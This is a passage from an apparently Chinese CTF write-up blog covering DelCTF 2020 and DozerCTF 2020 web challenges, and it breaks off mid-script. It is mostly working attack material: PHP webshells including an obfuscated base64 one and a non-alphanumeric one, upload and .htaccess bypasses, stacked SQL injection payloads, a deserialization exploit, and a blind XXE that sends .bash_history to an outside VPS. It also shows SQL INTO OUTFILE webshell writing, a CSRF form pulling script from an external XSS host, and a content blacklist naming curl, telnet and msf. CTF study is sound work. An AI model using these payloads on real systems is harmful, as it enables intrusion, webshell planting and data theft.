<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1.</span>p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">sh _</span><br><span class="line">sh y</span><br></pre></td></tr></table></figure>

<p>脚本访问</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://86568f48.yunyansec.com/?1=&#123;0&#125;&quot;</span></span><br><span class="line">print(<span class="string">&quot;[+]start attack!!!&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;payload.txt&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        print(<span class="string">&quot;[*]&quot;</span> + url.format(i.strip()))</span><br><span class="line">        requests.get(url.format(i.strip()))</span><br><span class="line"><span class="comment">#检查是否攻击成功</span></span><br><span class="line">test = requests.get(<span class="string">&quot;http://86568f48.yunyansec.com/1.php&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> test.status_code == requests.codes.ok:</span><br><span class="line">    print(<span class="string">&quot;[*]Attack success!!!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>然后就可以查看信息了</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://86568f48.yunyansec.com/1.php?1=phpinfo();</span><br></pre></td></tr></table></figure>

<p>连接蚁剑的话要构造一个post</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://86568f48.yunyansec.com/1.php?1=eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>在上一级的key可以找到flag{a1c8BFF2}</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>DelCTF 2020</title>
    <url>/2020/05/08/DelCTF2020/</url>
    <content><![CDATA[<p>题目对我来说太难，只复现了两道题目。<a id="more"></a></p>
<h4 id="Check-In"><a href="#Check-In" class="headerlink" title="Check In"></a><strong>Check In</strong></h4><p>一道上传漏洞题，会检查<code>Content-Type</code>和文件后缀黑名单，这个问题不大。</p>
<p>然后发现过滤文件内容黑名单：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet</span><br></pre></td></tr></table></figure>

<p>所以一句话木马需要用短标签绕过，即上传<code>1.jpg</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>然后上传<code>.htaccess</code>解析<code>1.jpg</code>，这里用换行符绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .jpg</span><br></pre></td></tr></table></figure>

<p>成功连接上蚁剑：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200506153323919.png" style="high:100%;width:100%;" />

<h4 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a><strong>Hard_Pentest_1</strong></h4><p>题目直接给出了源代码：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//Clear the uploads directory every hour</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$sandbox = <span class="string">&quot;uploads/&quot;</span>. md5(<span class="string">&quot;De1CTF2020&quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="meta">@mkdir($sandbox);</span></span><br><span class="line"><span class="meta">@chdir($sandbox);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">&quot;submit&quot;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            die($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]).<span class="string">&quot;_&quot;</span>.$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $filename);</span><br><span class="line">            echo <span class="string">&quot;save in:&quot;</span> . $sandbox.<span class="string">&quot;/&quot;</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&quot;Not Allow!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check()&#123;</span><br><span class="line">    $BlackExts = array(<span class="string">&quot;php&quot;</span>);</span><br><span class="line">    $ext = explode(<span class="string">&quot;.&quot;</span>, $_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[a-z0-9;~^`&amp;|]/is&#x27;</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">&#x27;/\.\./&#x27;</span>,$_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> true;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> false;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里的check函数对文件的内容过滤了字母数字以及一些符号，这里可以使用无字符数字RCE绕过，具体参考：<a class="foo" href="https://0xparrot.github.io/ctf/2020/05/05/PHP-Webshell-without-alphanumeric-and-semi-colon/" target="_blank">传送门</a></p>
<p>这里直接上传<code>6.Php</code></p>
<p>内容为：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?= $_=[] ?&gt; </span><br><span class="line">&lt;?= $_=@&quot;$_&quot; #Array ?&gt;</span><br><span class="line">&lt;?= $_=$_[(&#x27;!&#x27;==&#x27;@&#x27;)] #(&#x27;!&#x27;==&#x27;@&#x27;) results in 0 ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++#G ?&gt;</span><br><span class="line">&lt;?= $_______ = &quot;_&quot;.$__ #_G ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ #E ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GE ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $__ = $_ ?&gt;</span><br><span class="line">&lt;?= @$____ = $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ + $__++ #T ?&gt;</span><br><span class="line">&lt;?= $_______ .= $__ #_GET ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?= $&#123;$_______&#125;[&quot;_&quot;]($&#123;$_______&#125;[&quot;__&quot;]) # $_GET[&#x27;_&#x27;]($_GET[&#x27;__&#x27;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>这个<code>$_GET[&#39;_&#39;]($_GET[&#39;__&#39;]) ?&gt;</code>第一个参数是构造函数名，第二个构造函数的参数。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181225122.png" style="high:100%;width:100%;" />

<p>像这样就可以getshell了，但是想要连上蚁剑还得自己写一个一句话木马进去。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://47.113.219.76/uploads/bf0688c36193e28a369a9e96517e4c2f/0d253abf34c57f57099249cd1737873b_6.phP?_=system&amp;__=echo%20&quot;&lt;?php%20eval($_POST[%27a%27])?&gt;&quot;&gt;&gt;2.php</span><br></pre></td></tr></table></figure>

<p>然后就可以成功连上蚁剑了</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181750012.png" style="high:100%;width:100%;" />

<p>但是在蚁剑的终端输入<code>whoami</code>发现权限不够。</p>
<p>于是上传<code>cmd.exe</code>和<code>ms08066</code>在冰蝎里面进行提权。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507181915887.png" style="high:100%;width:100%;" />

<p>提权成功后发现</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507182333363.png" style="high:100%;width:100%;" />

<p>在<code>//192.168.0.12/Hint/</code>找到一个压缩包，下载下来发现有密码。</p>
<p>然后就涉及到域渗透的内容，具体参考：<a class="foo" href="https://3gstudent.github.io/3gstudent.github.io/域渗透-利用SYSVOL还原组策略中保存的密码/" target="_blank">传送门</a></p>
<p>在域中，存在一个默认的共享路径：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\</span><br></pre></td></tr></table></figure>

<p>然后输入<code>ipconfig /all</code>发现</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507182903605.png" style="high:100%;width:100%;" />

<p>就是说通过域内的共享文件夹保存了密码，微软把密钥公开了，所以可以通过破解这个密钥得到管理员的密码。</p>
<p>找到保存密码的地方</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507183414569.png" style="high:100%;width:100%;" />

<p>打开发现密钥</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200507183526055.png" style="high:100%;width:100%;" />

<p>然后用kail自带的gpp-decrypt解密</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508150215105.png" style="high:100%;width:100%;" />

<p>打开之前得到的压缩包输入密码即可得到flag。</p>
<h4 id="life"><a href="#life" class="headerlink" title="life"></a><strong>life</strong></h4><p>题目hint:No Game No Life!</p>
<p>这道题下载下来是一张图片，用<code>foremost</code>分离之后得到一个带密码的压缩包和一张类型二维码的图片。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175230822.png" style="high:50%;width:50%;" />

<p>这里需要了解一下生命游戏：<a class="foo" href="https://blog.csdn.net/u011439689/article/details/17226237" target="_blank">传送门</a></p>
<p>然后有个网站可以模拟生命游戏：<a class="foo" href="https://funnyjs.com/jspages/game-of-life.html" target="_blank">传送门</a></p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175630302.png" style="high:80%;width:80%;" />

<p>这里需要自己一个点一个点画上去，然后点击单步。</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508175832975.png" style="high:80%;width:80%;" />

<p>可以看到一个二维码，扫描二维码就可以得到压缩包的密码。</p>
<p>解开压缩包之后发现txt文件有一串数字</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>QjN1MTM0MTN0QjN3ImNjNzM3QTNmdTN3MTNmdzMzcjNxcjM3QTNmdDN2gzMzUjZ2czM0YDZzMjMxcDZ</span><br></pre></td></tr></table></figure>

<p>然后可以到<code>cyberchef</code>解密：</p>
<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200508180050173.png" style="high:100%;width:100%;" />]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>DozerCTF 2020</title>
    <url>/2020/06/17/DozerCTF/</url>
    <content><![CDATA[<p>干啥啥不行，赛后read writeup第一名。<a id="more"></a></p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h2><p>这道题是原题</p>
<p>首先提示url二次编码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?id=1%25%32%37</span><br></pre></td></tr></table></figure>

<p>发现报错，然后尝试select和union都被过滤了，尝试堆叠注入。</p>
<p>查询所有数据库:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show databases;#</span></span><br></pre></td></tr></table></figure>

<p>查询所有表:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show tables;#</span></span><br></pre></td></tr></table></figure>

<p>查询words表中所有列:(注意要加上反引号)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;show columns from `uziuzi`;#</span></span><br></pre></td></tr></table></figure>

<p>第一种payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30501/?id=-1%2527;set%20@sql%20=0x73656c6563742a66726f6d60757a69757a6960;prEpare%20stmt%20from%20@sql;EXECUTE%20stmt;%23</span><br></pre></td></tr></table></figure>

<p>预处理查询数据库内容，这里直接拼接字符串没法执行，所以把字符串转16进制再执 行。</p>
<p>第二种payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30501/?id=-1%2527;handler%20`uziuzi`%20open;handler%20`uziuzi`%20read%20first;%23</span><br></pre></td></tr></table></figure>

<h2 id="白给的反序列化"><a href="#白给的反序列化" class="headerlink" title="白给的反序列化"></a><strong>白给的反序列化</strong></h2><p>题目源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">    function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if (in_array($this-&gt;method, array(&quot;mysys&quot;))) &#123;</span><br><span class="line">            call_user_func_array(array($this, $this-&gt;method), $this-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mysys($path)</span><br><span class="line">    &#123;</span><br><span class="line">        print_r(base64_encode(exec(<span class="string">&quot;cat $path&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    function waf($str)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (strlen($str) &gt; <span class="number">8</span>) &#123;</span><br><span class="line">            die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $num = <span class="number">0</span>;</span><br><span class="line">        foreach ($this-&gt;args as $k =&gt; $v) &#123;</span><br><span class="line">            $this-&gt;args[$k] = $this-&gt;waf(trim($v));</span><br><span class="line">            $num += <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> ($num &gt; <span class="number">2</span>) &#123;</span><br><span class="line">                die(<span class="string">&quot;No&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;path&#x27;</span>]) &#123;</span><br><span class="line">    $path = @$_GET[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    unserialize($path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>构造exp</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">home</span></span></span><br><span class="line">&#123;</span><br><span class="line">    private $method;</span><br><span class="line">    private $args;</span><br><span class="line">        function __construct($method, $args)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;method = $method;</span><br><span class="line">        $this-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$o = new home(<span class="string">&quot;mysys&quot;</span>,[<span class="string">&#x27;flag.php&#x27;</span>]);</span><br><span class="line">echo serialize($o);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>关于<code>call_user_func_array</code>详情参考：<a style="text-decoration:none;" class="foo" href="https://www.php.net/manual/zh/function.call-user-func-array.php" target="_blank">传送门</a></p>
<p>这里需要改一下payload，因为服务器的php版本是 php5.59，没法直接改成public绕过（php7.1+版本对属性类型不敏感），所以需要吧s改成S（这样能识别16进制的<code>%00</code>）,把<code>&lt;0x00&gt;</code>替换为<code>\00</code>。</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://118.31.11.216:30600/?path=O:4:%22home%22:2:&#123;S:12:%22\00home\00method%22;S:5:%22mysys%22;S:10:%22\00home\00args%22;a:1:&#123;i:0;S:8:%22flag.php%22;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="svgggggg"><a href="#svgggggg" class="headerlink" title="svgggggg!"></a>svgggggg!</h2><p>题目的hint</p>
<ul>
<li>用户r1ck的操作记录在哪儿来着</li>
<li>如果你发现了sql注入，直接getshell吧，flag在/app目录里</li>
</ul>
<p>打开网页，有一个框要求输入URL，然后检查URL指向的file是不是svg图片</p>
<p>首先SVG是什么呢，SVG是基于XML的矢量图，可以支持Entity（实体）功能，这里未严格限制格式，因此造成blind xxe，ssrf打内网服务。</p>
<p>先写一个简单的SVG图片源码放在vps上</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab <span class="string">&quot;HELLO&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;	</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>提交SVG图片源码地址发现实体成功显示</p>
<p>然后尝试读取文件</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab SYSTEM <span class="string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">  &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>页面虽然正常返回信息，但是并不能直接读到我们想要的东西</p>
<p>无回显，又是XXE，可以尝试一下XXE盲打，也就是通过加载外部一个dtd文件，然后把读取结果以HTTP请求的方式发送到自己的VPS。</p>
<p>构造1.svg</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE fortiguard [ </span><br><span class="line">&lt;!ENTITY lab SYSTEM <span class="string">&quot;file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history&quot;</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">&quot;http://39.105.158.221:1234/1.dtd&quot;</span>&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg xmlns=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span>&gt;</span><br><span class="line">        &lt;text y=&quot;20&quot; font-size=&quot;20&quot;&gt;&amp;lab;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>构造1.dtd</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">        <span class="string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://39.105.158.221:1234/?%file;&#x27;&gt;&quot;</span></span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>

<p>注意这里使用伪协议读取源码，因为xml解析器支持使用php://filter进行编码。</p>
<p>这里需要vps上随便在一个文件夹上开启http服务，然后把1.svg合1.dtd丢进去即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>在网页提交1.svg的链接即可成功读取到.bash_history</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd /app</span><br><span class="line">php -S <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>

<p>然后利用SSRF打内网</p>
<p>查看源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/app/index.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>发现sql注入，写入url编码后的一句话木马</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/index.php?id=-1%27%20union%20select%201,%27%3C?php%20system($%5fGET%5bcmd%5d)%3b%3e%27%20into%20outfile%27/app/dashabi.php%27%23</span><br></pre></td></tr></table></figure>

<p>读取文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=ls&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>读取flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=http://127.0.0.1:8080/dashabi.php?cmd=cat%20H3re_1s_y0ur_f14g.php&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="fake-phpminiadmin"><a href="#fake-phpminiadmin" class="headerlink" title="fake phpminiadmin"></a>fake phpminiadmin</h2><p>开启nc监听</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nc -lvvp <span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>然后在content处输入nc监听的链接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">39.105</span><span class="number">.158</span><span class="number">.221</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>下面的code原来的验证码，比如：substr(md5(?), 0, 6) = b1a0fd，这里的验证码就是？。</p>
<p>需要一个脚本来爆破，这里贴一下解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"></span><br><span class="line"><span class="comment"># MD5截断数值已知 求原始数据</span></span><br><span class="line"><span class="comment"># 例子 substr(md5(captcha), 0, 6)=60b7ef</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">s</span>):</span>  <span class="comment"># 计算MD5字符串</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(str(s).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">keymd5 = <span class="string">&#x27;2ff56c&#x27;</span>   <span class="comment">#已知的md5截断值</span></span><br><span class="line">md5start = <span class="number">0</span>   <span class="comment"># 设置题目已知的截断位置</span></span><br><span class="line">md5length = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findmd5</span>(<span class="params">sss</span>):</span>    <span class="comment"># 输入范围 里面会进行md5测试</span></span><br><span class="line">    key = sss.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">    start = int(key[<span class="number">0</span>])   <span class="comment"># 开始位置</span></span><br><span class="line">    end = int(key[<span class="number">1</span>])    <span class="comment"># 结束位置</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(start, end):</span><br><span class="line">        <span class="comment">#print(md5(i)[md5start:md5length])</span></span><br><span class="line">        <span class="keyword">if</span> md5(i)[<span class="number">0</span>:<span class="number">6</span>] == keymd5:            <span class="comment"># 拿到加密字符串</span></span><br><span class="line">            result = i</span><br><span class="line">            print(result)    <span class="comment"># 打印</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">list=[]  <span class="comment"># 参数列表</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):   <span class="comment"># 多线程的数字列表 开始与结尾</span></span><br><span class="line">    list.append(str(<span class="number">10000000</span>*i) + <span class="string">&#x27;:&#x27;</span> + str(<span class="number">10000000</span>*(i+<span class="number">1</span>)))</span><br><span class="line">pool = ThreadPool(<span class="number">100</span>)    <span class="comment"># 多线程任务</span></span><br><span class="line">pool.map(findmd5, list) <span class="comment"># 函数 与参数列表</span></span><br><span class="line">pool.close()</span><br><span class="line">pool.join()</span><br></pre></td></tr></table></figure>

<p>看到Referer: <a href="http://127.0.0.1//admin_shark.php">http://127.0.0.1//admin_shark.php</a></p>
<p>这是管理员的后台地址，访问提示登陆地点错误。</p>
<p><strong>思路</strong></p>
<ul>
<li>执行sql语句处利用hex可以进行xss</li>
<li>contact功能处可以csrf</li>
<li>那我们可以将csrf的payload放在vps上，在contact处提交vps上payload的地址来触发xss读取后台源码。</li>
</ul>
<p>用于CSRF的表单</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(&#x27;&#x27;, &#x27;&#x27;, &#x27;/&#x27;)&lt;/script&gt;</span><br><span class="line">    &lt;form name=<span class="string">&quot;exp&quot;</span> action=<span class="string">&quot;http://127.0.0.1/sql.php&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">      &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;sql&quot;</span> value=<span class="string">&quot;select 0x3c734372497074207372433d2f2f78732e73622f56346f383e3c2f7343526970543e&quot;</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">document.exp.submit()</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这个是放在XSS平台的代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">function createXmlHttp() &#123;</span><br><span class="line">    <span class="keyword">if</span> (window.XMLHttpRequest) &#123;</span><br><span class="line">        xmlHttp = new XMLHttpRequest()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        var MSXML = new Array(<span class="string">&#x27;MSXML2.XMLHTTP.5.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.4.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP.3.0&#x27;</span>, <span class="string">&#x27;MSXML2.XMLHTTP&#x27;</span>, <span class="string">&#x27;Microsoft.XMLHTTP&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (var n = <span class="number">0</span>; n &lt; MSXML.length; n++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                xmlHttp = new 